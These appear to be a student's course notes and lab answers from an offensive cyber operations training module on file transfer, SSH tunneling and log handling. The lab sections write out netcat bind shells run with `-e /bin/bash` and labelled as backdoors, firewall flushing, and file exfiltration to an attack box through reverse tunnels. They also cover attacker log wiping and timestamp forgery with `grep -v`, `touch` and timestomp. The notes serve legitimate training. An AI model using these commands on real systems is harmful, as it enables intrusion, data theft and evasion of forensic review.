# CTE - Week 5

___

## Classroom Links

___

* [Teams](https://teams.microsoft.com/l/team/19%3a7a166f374eb44c89bb972a20cf5a3d6e%40thread.tacv2/conversations?groupId=b0216bab-7ebb-498b-af22-3d7c8db2d92f&tenantId=37247798-f42c-42fd-8a37-d49c7128d36b)  
* [CLME](https://learn.dcita.edu/)
* [CTE_TTPs_Lab_Manual_CTA_1901](.\Files\CTE_TTPs_Lab_Manual_CTA_1901.pdf)

___

## Lesson - Module 2 — Lesson 6: File Transfer

___

### Transferring Files

Common Name | Acronym | Typical Ports
--- | --- | ---
Secure Copy Protocol/Secure Shell |  SCP/SSH | TCP 22
File Transfer Protocol | FTP | TCP 20, 21
Trivial File Transfer Protocol | TFTP | TCP 69
Hypertext Transfer Protocol / HyperText Transfer Protocol Secure | HTTP/HTTPS | HTTP: TCP 80 / HTTPS: TCP 443
Server Message Block / Common INternet File System | SMB/CIFS | SMB: TCP 445
Network File System | NFS | TCP / UDP 2049, 111

* Secure Copy
  * `scp [ [user@] src host: ] src file [ [user@] dst host: ] dst file`
  * SCP Pullig
    * `user@src_host:src_file dst_file`
  * SCP Pushing
    * `scp src_file user@dst_host:dst_file`
* Windows SMB
  * `net use <drive letter > :< sharename> / user: [domain] \ < username>`

### Netcat

* Networking "Swiss Army knife"
* Can either initiate a TCP/UDP connection or bind to a port and listen for incoming connections
* Can be used for file transfers, banner grabbing, and port scanning
* Syntax varies depending on OS and Netcat version
* Netcat is not identical to ncat
    Common Option | Use
    --- | ---
    -e | \<prog> Inbound execute program, often removed
    -l | Listen for inboun connections
    -p \<port> | Local Port number
    -u | UDP mode
    -v | Verbose mode
    -h | Help

### Basic Netcat Usage

* Open a listening port on your Windows 7 VM
  * Don't forget to check your syntax  
    ![NetCat Listener](./Files/Images/NetCat-Listener.jpg)
* Connect to Windows 7 VM from CentOS
    ![NetCat Listener](./Files/Images/NetCat-Listener2.jpg)

### Using Netcat to Get a Remote Shell

* Use the -e option to execute a program after connection
    ![NetCat Listener](./Files/Images/NetCat-Listener3.jpg)
* Ensure the nc version you are using has the —e option.

### Transferring Files With Netcat

* Receiver sets up listener; sender calls forward
  * Destination: `nc -l <dst port> > <filename>`
  * Source: `nc 10.0.2.2 <dst_port < <filename>`
  ![NetCat File Transfer](./Files/Images/NetCat-File-Transfer.jpg)
* Reverse transfer
  * Sender sets up listener; receiver calls back
  * Source: `nc -1 <src port > < <filename>`
  * Destination: `nc <src_ip> <src_port> <filename>`
    ![NetCat File Transfer](./Files/Images/NetCat-File-Transfer2.png)

### Socat

* Socat accepts two bidirectional byte streams and transfers data between them.
* Typical Examples:
  * Opens TCP over IPv4 `TCP4: <host>:<port>`
  * Opens a TCP listener on port, IPv6 only `TCP6-LISTEN:<port>,fork`
    * `fork` option - multiple simulataneous uses
  * Autoselect network protocol based on \<host> `UDP:<host>:<port> -open UDP connection`

### Transferring Files via Terminal

* Sometimes all you have is a console window
  * For example, telnet; shell from exploitation
* Paste can copy text, but what about binaries
  * Need to encode as text, then paste and decode
* Solutions
  * uuencode/uudecode—common on UNIX
  * Interpreters on target—Perl, Python, Bash, GCC
    * For example, perl has uudecode built in

### Packers

* Executable packers are applications that compress and obfuscate an executable
  * Smaller-sized executable
  * Different file hash
* A common packer used by malware us UPX
  * Most antivirus software detects the presence of UPX packing and flags it as possible
* The following example is provided for the upx.exe program to create a UPX-compressed executable
  * `upx.exe -o <Outfile> -<0-9> <Input File>`

___

## Exercise - Module 2, Lesson 6 – File Transfers

___

### Scenario 1

1. Scan TCP ports 2 through 90 on the target machine. Create scans that will do the following:  
    * Return messages on Standard Error with as much detail as possible  `-v`  
    * Not perform a DNS Inquiry `-n`  
    * Emit a packet without payload  `-z`  
    * Timeout after 1 second  `-w1`  
    * Record the actions taken  `nc -v -n -z -w1 10.10.1.70 2-90`  

    Port | Service | Status
    --- | --- | ---  
    88 | Kerberose | Time Out
    87 | Link | Time Out
    80 | http | Open
    78 | Finger | Time Out
    70 | gopher | Time Out
    68 | Bootpc | Time Out
    67| BootPS  | Time OUt
    65 | tacacs-ds | Time OUt
    53 | Domain | Time Out
    50 | re-mail-ck | Time Out
    49 | tacacs | Time Out
    43 | Whois | Time Out
    42 | NameServer | Time Out
    37 | time | Time Out
    25 | smtp | Time Out
    23 | telnet | Open
    22 | ssh | Open
    21 | ftp | Time Out
    20 | ftp-data | Time Out
    19 | chargen | Time Out
    18| msp | Time Out
    17 | qotd | Time Out
    15| netstat | Time Out
    13| daytime | Time Out
    11 | systat | Time Out
    09 | discard | Time Out
    07 | echo | Time Out

2. If a web port is open, what is the port number?
   * `80`
3. Use netcat on the Kali machine to connect to the target. Once the connection is made, retrieve the target’s banner. 
   * `echo "" | nc -v -n -w1 10.10.1.70 2-90`
   * 80 - Server: Apache/2.4.18 (Ubuntu)
   * 22 - SSH-2.0.OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
4. Flush the iptables on the Ubuntu machine, clear any additional chains and ensure all default tables’ policies are set to ACCEPT.
   * `sudo iptables -F`
   * `sudo iptables -P INPUT ACCEPT`
   * `sudo iptables -P FORWARD ACCEPT`
   * `sudo iptables -P OUTPUT ACCEPT`
5. Create two persistent listeners (backdoors) on the Ubuntu machine. Use port 8888 for the first listener and 9999 for the second listener.
   * `nc -l -p 8888 -e /bin/bash`
   * `nc -l -p 9999 -e /bin/bash`
6. Connect to the first Ubuntu listener using Kali on port 8888.
   * `nc 10.101.70 8888`
7. Create a listener on the Kali machine to accept the incoming file transfer on port 6666.
   * on Kali - `nc -l -p 6666 > filein.txt`
8. Create a services.txt file by running the following command:
sudo systemctl list-units --type service --all > / home/intern01/services.txt
9. Transfer the /home/intern01/services.txt file to Kali and document the
command/syntax used.
   * On Ubuntu - `nc 10.10.1.60 6666 < services.txt`
10. Connect to the second Ubuntu listener using Windows 10 on port 9999.
11. Create a listener on the Windows 10 machine to accept the incoming file transfer on port 7777. Transfer the /home/intern01/services.txt file to Windows 10.
    * On Win10 - `nc -l -p 7777 > filein.txt`
    * On Kali vi `nc 10.10.1.70 9999` `nc 10.10.1.20 7777 < services.txt`

### Scenario 2

1. From the Windows 10 machine, use PuTTY to telnet into the Ubuntu machine with username intern and the password password.
   * `intern01:CTEPasswd1976`
2. Find the uuencode/uudecode tool in the Windows Administrator’s “NetworkTools” folder.
    * `c:\users\srogers\Desktop\NetworkTools\uuencode.exe`
3. The uuencode syntax differs slightly between Linux/Unix and Windows; uuencode the socat binary from the Network Tools directory and name the file socat.uu.
    * `uuencode.exe socat_1.7.2.3-1_i3896.deb socat.uu`
4. How big is the uuencoded socat binary in KB? `418268 kb`
5. Open the recently encoded file with Notepad++.
a. Select all the file content by pressing \<CTRL> + A
b. Copy to the clipboard by pressing \<CTRL> + C
6. On the putty telnet prompt execute the following cat > socat
   * `cat > socat` `Copied text`
7. Once the word “end” appears in the PuTTY window, stop the transfer by pressing \<CTRL> + D
8. What is the size in KB of the transferred file? `411639`
9. Is the file size the same as the original executable? `It is larger`
10. What needs to change for the file to be executed successfully on the new host?
    * `Decode on the other side`

### Scenario 3

1. Open a command prompt and navigate to the Transfer directory on the Windows 10 desktop.
2. Use upx.exe to pack fpipe.exe.
   * `upx.exe -9 -o fpipe.pak fpipe.exe`
3. Use upx.exe to pack windump.exe.
   * `upx.exe -9 -o windump.pak windump.exe`
4. Change the file extension from .pak to .exe and delete the original files.
5. Use netcat to move the files from the Attack/Ops machine to the Target.
   * On win10 `nc.exe -l -p 5555 < windump.exe`
   * On kali `nc 10.10.1.20 555 > windump.exe`
6. Verify the file transfer.
   * `ls -lah windump.exe` - 219 kb
7. Cleanup.
8. Tear down communications.

___

## Lesson - Module 2 Lesson 7: Tunneling

___

### Network Engineering Blues

* Sometimes traffic does not play nicely with pipes it needs to go through
  * Privately Between addressed networks
    * Intervening links will not route
    * Somewone wants to block your traffic
  * Protocol is usupported
    * Your ISP does not route IPv6 yet
    * Someone want to spy on your traffic

### Tunneling

* Tunneling is the solution
  * Put traffic you wan to send inside a protolcol that can get to your desired destination
  * VPN example
    * Bob cannot directly access his company's internal network from home
    * Bob  uses a VPN client on his laptop to connect to his company's VPN concentrator, creating a tunnel
    * Using the tunnel, Bob's VPN client encapsulates and encrypts all traffic destined for the company network and sends it to the concentrator

### IPv6 to IPv4 Tunneling

* IPv6 migration: <25% of world ISPs have adopted IPv6
  * Makes it tough to be an early adopter
  * Multiple solutions proposed—ISATAP, Teredo
  * 6t04 Tunneling
* Solution is Simple
  * Put IPv6 packet in an IPv4 packet
  * Methodology is standardized, IPv4 next protocol 41
  * Packet routes over IPv4 to the other endpoint
  * IPv4 framing is stripped at the other end, and IPv6 packet is processed

### Finer Points of Tunneling

* Tunneling can be at any layer of the network stack:
  * Lower levels usually integrated into OS
  * Higher levels typically into application software
* Tunneling can put lower layers into other ones.
  * Ethernet over IP why not? (Why?)
  * As long as you have the software on both ends to process it, you can tunnel any protocol over another

### Secure Shell (SSH)

* SSH is used for encrypted terminal access across a network
  * SSH server (sshd) listens on a bound port 22
  * SSH client initiates a TCP session to the server
* SSH has multiple channels/tunnels
  * Tunnels can be set to listen on a preconfigured port
  * Tunnels forward packets to the SSH peer
  * The receiving end sends packets to a preconfigured destination

### Forward vs. Reverse

* Each channel opens only one listener
* Forward Tunnel
  * SSH client opens the tunnel listener
  * SSH server redirects received data
  * Call forward: Initiate a connection to the remote machine
* Reverse Tunnel
  * SSH server opens the tunnel listener
  * SSH client redirects received data Call back: Expect something else to establish a connection

### Tunnels in Detail

* Tunnel setup:
  * Issue command on client:
    * `ssh <userA>@<Server1> - L<lis_port>:<dst_ip>: <dst_port>`
  * Client connects to server 1 with userA credentials
  * Client/server negotiates a channel for the tunnel
  * Client creates a listening socket on < lis port >
  * Server redirects traffic traveling through tunnel to
    * `<dst ip:dst port>`
* Connection:
  * Connect to the tunnel listener using client software (e.g., ssh, telnet, web browser, netcat)
  * Client negotiates the TCP handshake with the tunnel listener
  * Packet from the client is passed through the tunnel
  * SSH peer negotiates the TCP handshake with the intended target
  * Data are forwarded to the intended destination
  * All subsequent packets flow through tunnels and are redirected

### Tunnel Diagrams

![Tunnel Diagram](./Files/Images/tunnel1.png)

* First line shows SSH connection:
  * Single dash (----) represents a TCP connection
  * \< denotes that the host is listening on a public interface
* Second line represents a TCP connection to the third host via the tunnel:
  * \> denotes that the host is listening on a local loopback interface
  * \==== represents the SSH tunnel

### Operational Concept

* Conceptually, split machines into three types:
  * Ops Machine
    * Machines under you direct physical control
    * Can reconfigure, add software and more at will
  * Redirectors
    * Machines to wicht you have access but not control
    * Standalone tools can be uploaded
  * Target
    * Machine you are trying to access

### SSH Into Remote Machine

![SSH Tunnel](./Files/Images/tunnel2.png)

* Connect to redirector, setup tunnel with redirector:
  * `ssh administrator@192.168.10.3 -L5555:192.168.108:22`
* Connect to target host through tunnel:
  * `ssh root@127.0.0.1 -p 5555`
  * Network destination changes to local listener
  * Username/password remain the same for the target host

### Multiple Operations Boxes

* By default, forward tunnels listen on localhost (127.0.0.1)
* May want multiple ops boxes to access a tunnel:
  * Usually set up tunnels w/Linux (better SSH tools)
  * Client may be Windows based (RDP, SMB)
* Can configure using ssh syntax:
  * -gL14560:192.168.100.4:22
  * L0.0.0.0:14560:192.168.100.4:22

![Multiple SSH Tunnels](./Files/Images/tunnel3.png)

* Set up a tunneon on CentOS VM:  
  * `ssh root@192.168.10.7 -gL14560:192.168.100.4:22`
* Connect to target from Windows XP VM:
  * mstsc [v: 192.168.1.14:8661
  * Log in using credentials for 192.168.10.3 (IIS Server)

### FTP Into Remote Machine

![FTP over SSH Tunnels](./Files/Images/ftp1.png)

* Set up tunnel:
  * `ssh root@192.168.10.7 -L3342:192.168.10.8:21`
* Connect to target via tunnel:
  * `ftp 127.0.0e.1 3342`
* Get an FTP connect but cannot get data back. Why not?

### Why Multi-Hop?

* Multiple redirectors:
  * Hide your original location better
* Multiple targets:
  * Ultimate target may be buried within network
  * Multiple hops may be required to circumvent filtering and security devices

### Using Two Hops

![Multiple Hop SSH Tunnel](./Files/Images/tunnel4.png)

* Connection to first redirector and first tunnel:
  * `ssh administrator@192.168.10.4 -L 35261: 192.168.10.7:22`
* Connection to second redirector and second tunnel via tunnel:
  * `ssh root@127.0.0.1 -p 35261 -L 16242: 192.168.1e.6:80`
* Connect to target via tunnels:
  * Point web browser at `http://127.0.0.1:16242`

### Public/Private

* Often, one set of addresses is used for public access, while another is used for private
  * Machines can have multiple network interfaces
  * Network address translation (NAT)
* Remember who is connecting
  * Addressing is done on a hop-by-hop basis
  * If using public addressing to get beyond firewall/NAT, you need private  addressing to redirect to hosts in the network

### Reverse Tunnels

* Why?
  * Port Forwarding
    * May want a remote server to access a service
  * Exloitation
    * Many exploits work by calling back to a machine that you control
  * Evade Filtering Devies
    * some scenarious allow outbound connections only
* Common thread: The remote end initiates the TCP connection

### Reverse Tunnel Syntax

* `—R [<1 address>:port>:<dst ip> :<dst port>`
* SSH server opens a socket listener on \<l_port> on \<l_address>
* Default address for -R is 0.0.0.0
* Client/server negotiates channel for tunnel
* When some remote machine connects to listener, packets are forwarded to SSH client through tunnel
* SSH client opens connection to \<dst_ip> on \<dst_port> and forwards packets

### Basic Port Forwarding

![Reverse Tunnel](./Files/Images/ReverseTunnel1.png)

* SSH is already running on your machine
* Set up tunnel:
  * `ssh root@192.168 .10.7 -R8022:127.0.0.1`
* Connect from outsid the network
  * `ssh root@192.168 .10.7 -p 8022`

### Reverse Tunnel Diagram

![Reverse Tunnel Diagram](./Files/Images/ReverseTunnel2.png)

* Set up tunnel on Win7 physical:
  * `ssh root@192.168.10.5 -R24981:127.0.0.1:6677`
* Set up necat listener on Win7 physical:
  * `nc -L -p 6677`
* Connect from remote host on FTP server:
  * `nc 192.168.10.5 24981`

### Multiple Hops: Reverse Tunnel

![Reverse Tunnel Diagram](./Files/Images/ReverseTunnel3.png)

### Additional Tunnels

* Suppose we want to add a tunnel after we have already set up our infrastructure
* Closing and reopening = bad OPSEC
* Native ssh command has built-in SSH prompt
* Entering —C in an open SSH window gives you a new prompt that allows you to set up tunnels:
  * `[root@localhost ~]# <~> + <c>`
  * `ssh> - L4444:127.0.0.1:8080`
  * Forwarding port
  * `... <CTRL> + <c>`
  * `[root@localhost ~]#`

___

## Exercise - Module 2, Lesson 7 – Tunneling and Data Exfiltration

___

### Senario 1

1. Draw a diagram of the tunnels that will be created. Indicate the client connection created by the beacon on the diagram and document the command used to set up the netcat listener that will receive the communications.

![Exercise Diagram](./Files/Images/TunnelExercise.png)

2. Set up the netcat listener.  
  On Win10 - `nc -l -p 6677`  
3. Set up the tunnel infrastructure.  
  On Win10 - `ssh root@10.10.1.40 -L 1111:10.10.1.60:22` - to CentOS  
  On Win10 - `ssh root@127.0.0.1 -p 1111 -L2222:10.10.1.70:22` - to Kali  
  On Win10 - `ssh nimda@127.0.0.1 -p 2222 -R31330:127.0.0.1:31330`
4. Conduct a brief survey of the target in question by investigating the following:  
  a. Important log files at /var/log  
    `cat /var/log/syslog*`  
  b. Recent security events  
    `cat /var/log/ufw*`
  c. Network configurations  
    `ifconfig`
    `/etc/nsswitch.conf`
  d. Listing network connections  
    `netstat -nao | grep LISTENING`
  e. Listing users  
    `awk -F ':' '{print $1}' /etc/passwd`  
  f. Look at schedule jobs  
    `crontab -l`  
  g. Check DNS settings and the host file  
    `cat /etc/hosts`
    `cat /etc/resolv.conf`
    `cat /etc/hosts.deny`  
  h. Look at auto-start services  
    `upstart`
5. Wait two minutes to receive the communications.
6. Document the intercepted communication.
7. Clean up.
8. Tear down the SSH tunnels in the proper order.

### Senario 2

1. Clear the iptables including the extra chains on the FTP server and set all default tables policy to ACCEPT.  
  `iptables --list`  
  `iptables -P INPUT ACCEPT`  
  `iptables -P OUTPUT ACCEPT`  
  `iptables -P FORWARD ACCEPT`  
  `iptables -F`  
2. Diagram the forward tunnels and the reverse tunnel , then document the commands that will be used to create them.
3. Indicate where the client connection on the diagram and create the command syntax for the netcat listener that will be set up to receive the FTP communications.  
  On Win10 `ssh root@10.10.1.40 -L1111:10.10.1.60:22`  
  On Win10 `ssh root@127.0.0.1 -p 1111 -L2222:10.10.10.70:22`- To Kali  
  On Win10 `ssh nimda@127.0.0.1 -p 2222 -L3333:10.10.10.1.71:21` - To Ubuntu  
  On Win 10 `ssh nimda@127.0.0.1 -p 2222 -R54197:127.0.0.1:54197` - Reverse from Ubuntu  
4. Prepare a netcat listener on the attack machine to receive the file sshd_ config from the FTP server on port 54197.  
On Win 10 `nc -lvp 54197 > sshd_config`  
5. Complete the file transfer.
NOTE: Once you are logged into the FTP server, use the quote \<ftp command> parameter command to inform the server which port is being used by your netcat listener for the transmission, Next, use quote
\<ftp command> parameter to retrieve the desired file.  
`ftp open 127.0.0.1 3333`  
`nimda -> <password> -> ls`  
`cd /etc/ssh`  
`quote port 10,10,1,70,211,181`
`get sshd_config`
6. Clean up.  

___

## Lesson - Module 2 Lesson 8: Logs and Redirection

___

### UNIX System Log Files

* Logs can be modified/wiped easily
* Easy to Modify/Wipe Logs
  * `/var/adm` - Solaris
  * `/var/log` - Linux
  * `~/.bash_histor`
* Syslog
  * Configurable logging service
  * Configured via `/etc/rsyslog.conf` - Solaris
  * configured via `/etc/syslog.conf` - Linux
* The syslog servie can be configured to first write to the local system, after logs are written locally, logs are then forwarded to a remote syslog server based on the configuration file

### Sample UNIX Log Entries

* Very Secure FTP log file  
![Secure FTP](./Files/Images/Lesson8/SecureFTP.jpg)
* `/var/log/secure`  
![Secure FTP](./Files/Images/Lesson8/var-log-secure.png)  

### Windows Event Logs  

* Simple actions use countless components that are logged and produce a significant amount of auditable information
* Event logs can be useful in determining cause and effect during an investigation
* Event log timestamps are recorded in GMT
* When the system displays the event logs, the timestamp is adjusted for the computer's time zone
* Implemented since Vista and Server 2008
* Provided new features and enhancements from the previous .evt format
* The use of channels
  * Serviced
  * Direct
* XML Formatted

### Windows .evtx Channels

* Admin
  * Used by IT Professionals
  * Disabled by default
  * Produces high volume of event; not user-friendly
* Operational
  * Used for analyzing and diagnosing a problem or occurrence
  * Example: An event that occurs when a printer is added or removed from a system
* Analytic
  * Events published in high volume
  * Indicate problems that canot be handled by user interventions
* Debug
  * Used by developers to troubleshoot issues with programs

### Policy Assessment Overview

* There are three types of logs:
  * Application
    * Events from local applications
  * Security
    * Events from LSASS.exe and audit policy
  * System
    * Events from operating system
* Examples of event log entries:
  * `System/Application`
    * Error/Warning/Information
  * `Security`
    * Success Audit/Failure Audit

### Windows Event Logs: Vista+

* Microsoft rewrote their event logging in Vista:
  * Now XML-based
  * Allows for centralized logging by default 
* Event Collector/Event Subscriber allows events to be sent between hosts as XML

Windows Remote Manager (Winrm) 1.1 and earlier | Default ports: HTTP/Port 80 or HTTPS/Port 443
---|---
Winrm 2.x | Default ports: HTTP/Port 5985 or HTTPS/Port 5985

### Event Log Categories: Vista+

* Forward Log
  * Events forwarded to another system are logged in the forward log
  * Accomplished using event subscriptions
    * Event subscriptions identify what events are collected
    * Winrm listens and receives events  
* Application and Service Logs
  * Logs for the programs running on a system
  * Logs pertaining to Windows services
* Setup Logs
  * Events on computers configured as domain controllers
  * Client machine setup logs

### Application Logs

* Not reliable due to their non-standardization
* Combined with system events, these events can show symptoms of suspected intrusions
* Events relevant to an investigation:
  * Application errors
  * Antivirus or malware detection events
  * Host-based firewall logs
* Webservers
  * `/var/log/httpd/`
  * `%SYSTEMROOT\system32\logfiles\W3SVC#\*.log`
* Security Products
  * `C:\Program Files <product name>`
  * `C:\Documents and Settings\All Users\Application`
  * `C:\Documents and Settings\<user name>\Application Data`
* Other Applications
  * Instand Messengers/Chat programs
  * Windows Scheduler Service

### Pre-Vista vs. Vista+ Log Locations

* In a different location:
  * Pre- Vista folder location: `C:\Windows\System32\config`
  * Post-Vista folder location: `C:\Windows\System32\winevt\Logs`
* Event IDs for security logs have changed:
* Add 4096 to pre-Vista event IDs to obtain Vista+ event ID values

### Dump Log Files

* Created during system or application crashes
* Contains pertinent information about the state of the system at the time of the crash:
  * Memory; Processor Registers; Pointers & Other Info
* Use to diagnose or debug errors
* UNIX: core dump
* Microsoft: minidump or memory.dmp (in %SYSTEMROOT%)

### Security Audit Policies

* Security audit policies can also be viewed using the command line via the auditpol . exe command
* `auditpol.exe /get /category: *`

![AutditPol](./Files/Images/Lesson8/auditpol.jpg)

### Server Log Files

* Web servers store a lot of data in various locations
  * Logs contain information relating to authentication success and failure, IP addresses and more
    * IIS
    * Apache
* Web Proxy servers are used as an intermediary between a web browser and the internet
* Events are logged in local time but this is configurable
  * All server log files should be reviewed

### Apache Web Server Logs

* Access logs — contains information about request coming to the web server
![Apache Web Server](./Files/Images/Lesson8/apache-web-server-log1.png)
* Error logs — contains information about errors encountered by the server
![Apache Web Server](./Files/Images/Lesson8/apache-web-server-log2.png)

### Apache Web Server logs location

* Debian/Ubuntu/LinuxMint

Directive/Setting | Config File | Path Value
--- | --- | ---
*SUFFIX | /etc/apache2/envvars | (see configfile for conditional logic)
APACHE_LOG_DIR | /etc/apache2/envvars | exportAPACHE LOG DIR=/var/10g/apache2SSUFFIX
AccessLog | /etc/apache2/sites-available/OOO-default.conf | CustomLog S{APACHE LOG DIR}/access.log combined
ErrorLog | /etc/apache2/apache2.conf | ErrorLogS{APACHE LOG DIR}/error.10g
LogLevel | /etc/apache2/apache2.conf | warn
LogFormat | /etc/apache2/apache2.conf |  %O "%{Referer}i" "%{User-Agent}i"" combinedLogFormat "%h %l %u %t "%r" %O" commonLogFormat refererL ogFormat "%{User-agent}i" agent
CustomLog | /etc/apache2/conf-available/other-vhosts-access-log.conf | CustomLog S{APACHE LOG DIR}/other_vhosts_access.log log.conf vhost combined

___

* Red Hat/Fedora/CentOS

Directive | Config File | Path Value
--- | --- | ---
AccessLog | /etc/httpd/conf/httpd.conf | /var/log/httpd/access_log
ErrorLog | /etc/httpd/conf/httpd.conf | /var/log/httpd/error_log
LogLevel | /etc/httpd/conf/httpd.conf | warn
*LogFormat | /etc/httpd/conf/httpd.conf | LogFormat "%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i""combinedLogFormat "%h %l %u %t "%r" %>s %b" common
**LogFormat | /etc/httpd/conf/httpd.conf | LogFormat "%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i" %l %O" combinedio
*CustomLog | /etc/httpd/conf/httpd.conf | CustomLog "logs/access_log" combined

___

* OpenSUSE  

Directive | Config File | Path Value
--- | --- | ---
AccessLog | /etc/apache2/sysconfig.d/global.conf | /var/log/apache2/access_log
ErrorLog | /etc/apache2/httpd.conf | /var/log/apache2/error_log
LogLevel | /etc/apache2/sysconfig.d/global.conf | warn
*LogFormat |  /etc/apache2/mod_log config.conf | LogFormat "%h 0/01 %u %t "%r"  %b" commonLogFormat "%v %h 0/01 %u %t "%r" %b" vhost_commonLogFormat "%{Referer}i -> %U" refererLogFormat "%{User-agent}i agentLogFormat "%h 0/01 %u %t "%r" %b "%{Referer}i" "%{User-Agent}i"" combinedLogFormat "%v %h 0/01 %u %t "%r" %b "%{Referer}i" "%{User-Agent}i"" vhost combined
**LogFormat | /etc/apache2/mod_log config.conf | LogFormat "%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i" "%l $O" combinedio
***LogFormat | /etc/apache2/mod_log | LogFormat "%t %h %{SSL_PROTOCOL}x%{SSL_CIPHER}x"%r" %b" ssl_commonLogformat "%t %h %{SSL_PROTOCOL}x%{SSL_CIPHER}x "%r" %b "%{Referer}i" "%{User-Agent}i"" ssl_combined

### Windows Webserver (IIS) Logs

* Microsoft IIS logs location:
  * `C:\Windows\system32\LogFiles\W3SVC1`
* WC3 Extended Log File Format

![IIS Web Server WC3 Log](./Files/Images/Lesson8/IIS-Log1.png)

* Microsoft IIS Logging Formats
  * IIS Log File Format

![IIS Web Server WC3 Log](./Files/Images/Lesson8/IIS-Log2.png)

* Microsoft IIS Logging Formats
  * NCSA Common Log File Format
    * `172.21 13.45- Microsoft\fred [08/Apr/2001  "GET
/scripts/iisadmin/ism-dll?http/serv HTTP/I -0" 200 3401`
  * ODBC Logging

### Logon Events

* These events are essential to establish a pattern of logon times for a user
* These events are used to flag a logon at an unusual hour or day
* Failed logon events may be evidence of brute force or password guessing attacks
* Not all accesses result in a logon event (e.g., FTP does not produce a logon event)
* See Student Guide for important event IDs

### Log Cleanig

* Attackers

1. Locate any files that have changed since you threw your first exploit
2. If possible, remove evidence of your mission from the log file
3. Change the timestamp on the log file to the last entry in the file
4. If removing your evidence creates a zero-byte file, change the timestamp to another zero-byte file in the same directory
    * This allows you to blend in if logs are being forwarded
    * If logs are not being forwarded, change the timestamp to match another file in the directory

* Defenders
  * Reviewing all logs, and combining output from different logs, assist with determining if the system has been copromised
* Look for logs that changed since your arrival:
  * Antivirus, Firewall, Dr. Watson (pre-Vista), Problem Reports and Solutions (Vista+), and Application logs
  * Unix
    * Usually easy and straightforward
  * Windows Event Logs
    * Very difficult
  Tools
    * Unix: find, grep, wc, cat, tail, head (and others)
    * Windows: dir, find

### Windows find Command

* `run multicommand -c1 "cmd /c find /?"`

```cmd
C:\Users\honey>find /?
Searches for a text string in a file or files.

FIND [/V] [/C] [/N] [/I] [/OFF[LINE]] "string" [[drive:][path]filename[ ...]]

  /V         Displays all lines NOT containing the specified string.
  /C         Displays only the count of lines containing the string.
  /N         Displays line numbers with the displayed lines.
  /I         Ignores the case of characters when searching for the string.
  /OFF[LINE] Do not skip files with offline attribute set.
  "string"   Specifies the text string to find.
  [drive:][path]filename
             Specifies a file or files to search.

If a path is not specified, FIND searches the text typed at the prompt
or piped from another command.
```

### Windows findstr Command

* For redirection, provide a shell:
  * `run multicommand -cl "cmd /c findstr "string" > newfile.txt"`

```cmd
C:\Users\honey>findstr /?
Searches for strings in files.

FINDSTR [/B] [/E] [/L] [/R] [/S] [/I] [/X] [/V] [/N] [/M] [/O] [/P] [/F:file]
        [/C:string] [/G:file] [/D:dir list] [/A:color attributes] [/OFF[LINE]]
        strings [[drive:][path]filename[ ...]]

  /B         Matches pattern if at the beginning of a line.
  /E         Matches pattern if at the end of a line.
  /L         Uses search strings literally.
  /R         Uses search strings as regular expressions.
  /S         Searches for matching files in the current directory and all
             subdirectories.
  /I         Specifies that the search is not to be case-sensitive.
  /X         Prints lines that match exactly.
  /V         Prints only lines that do not contain a match.
  /N         Prints the line number before each line that matches.
  /M         Prints only the filename if a file contains a match.
  /O         Prints character offset before each matching line.
  /P         Skip files with non-printable characters.
  /OFF[LINE] Do not skip files with offline attribute set.
  /A:attr    Specifies color attribute with two hex digits. See "color /?"
  /F:file    Reads file list from the specified file(/ stands for console).
  /C:string  Uses specified string as a literal search string.
  /G:file    Gets search strings from the specified file(/ stands for console).
  /D:dir     Search a semicolon delimited list of directories
  strings    Text to be searched for.
  [drive:][path]filename
             Specifies a file or files to search.

Use spaces to separate multiple search strings unless the argument is prefixed
with /C.  For example, 'FINDSTR "hello there" x.y' searches for "hello" or
"there" in file x.y.  'FINDSTR /C:"hello there" x.y' searches for
"hello there" in file x.y.

Regular expression quick reference:
  .        Wildcard: any character
  *        Repeat: zero or more occurrences of previous character or class
  ^        Line position: beginning of line
  $        Line position: end of line
  [class]  Character class: any one character in set
  [^class] Inverse class: any one character not in set
  [x-y]    Range: any characters within the specified range
  \x       Escape: literal use of metacharacter x
  \<xyz    Word position: beginning of word
  xyz\>    Word position: end of word

For full information on FINDSTR regular expressions refer to the online Command
Reference.
```

* The newfile.txt file contains a list of IP addresses. We want to remove IP 10.0.100.70 from newfile.txt and then change time/date of file to original date and time.

![findstr1](./Files/Images/Lesson8/findstr2.jpg)
![findstr2](./Files/Images/Lesson8/findstr1.jpg)

* Use the move command to overwrite the contents of the original file.
![findstr3](./Files/Images/Lesson8/findstr3.jpg)

### Windows timestamp Command

* Use the timestomp command to return the file to its original date and time.
![Timestop](./Files/Images/Lesson8/TimeStop.jpg)

### Cleaning Logs: Always Use Multicommand Script

![MultiCommand](./Files/Images/Lesson8/Multicommand1.jpg)
![MultiCommand](./Files/Images/Lesson8/Multicommand2.jpg)

### Windows Modify File Timestamp With timestomp

![Modify Timestamp](./Files/Images/Lesson8/TimeStomp2.jpg)

### Unix Log Cleaning

* Look at contents of file using `cat`
* Run `cat` and `grep` for you IP
  * Is your IP present?
* Use `grep -v` to remove you IP and redirect the output
* Use `touch` command to change the timestamp
* example:

```bash
cat secure | grep -v "<string>" > newfile
mv newfile secure
touch -t <date_and_time> secure
```

### UNIX: Modify File Timestamp with touch Command

![Touch Command](./Files/Images/Lesson8/Touch1.jpg)

### Syslog

* Standard protocol for forwarding log messages to a central host
* Sent in clear text:
  * Uses UDP/514 by default
* Small (less than 1 KB) text messages
* Not native in Windows
* UNIX: Setting in `/etc/syslog.conf` file:
  * Look for /oghost setting
   Check for entry with remote IP address

### Syslog Configuration File

![Syslog](./Files/Images/Lesson8/Syslog1.jpg)

### Centralized Log Management

![Splunk](./Files/Images/Lesson8/Splunk.jpg)

### Redirection

* Most exploiters tend to use at least one layer of redirection between the attacker and the actual target.
* Redirection
  * Adds obfuscation into the connection
  * Reduces the risk of detection by the target
* Tunneling
  * A forard tunnel to deliver the exploit
  * A reverse tunnel fot the callback

### Redirection via SSH Tunnels

![Redirection via SSH Tunnels](./Files/Images/Lesson8/Redirection-SSHTunnels.png)

### SSH Tunnel and Meterpreter Options

![SSH Tunnels](./Files/Images/Lesson8/SSHTunnels.png)

### Example 1 : Preparing the Payload

![Example 1](./Files/Images/Lesson8/SSHTunnels-Example1.jpg)

### Example 1 : Bad Tradecraft

![Bad Tradecraft](./Files/Images/Lesson8/bad-tradecraft.png)

### Redirection Tunnel Example

